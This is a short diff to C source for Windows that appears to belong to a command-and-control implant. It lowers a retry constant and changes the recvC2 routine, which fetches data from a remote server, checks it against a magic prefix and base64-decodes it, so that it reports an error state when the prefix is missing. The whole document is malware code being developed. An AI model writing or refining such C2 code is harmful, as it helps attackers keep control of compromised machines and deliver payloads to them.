@@ -1,7 +1,7 @@
 #ifndef C2_INCLUDED
 #define C2_INCLUDED
 #define BACKLOG 1000000
-#define MAX_RETRIES 5
+#define MAX_RETRIES 3
 #include <stdio.h>
 #include <windows.h>
 #include <stdlib.h>
@@ -127,7 +127,10 @@ VMstate recvC2(C2 conn){
             char* out = calloc(1000000, 1);
             if(webreq(req, 1000000, out, FALSE) == -1)
                 goto fin;
-            if(memcmp(out, magic, strlen(magic)) != 0) goto fin;
+            if(memcmp(out, magic, strlen(magic)) != 0){
+                state.isize = -2;
+                goto fin;
+            }
             char* data = calloc(b64d_sz(strlen(out))+100, 1);
             char* od = data;
             base64_decode(out+strlen(magic), data);
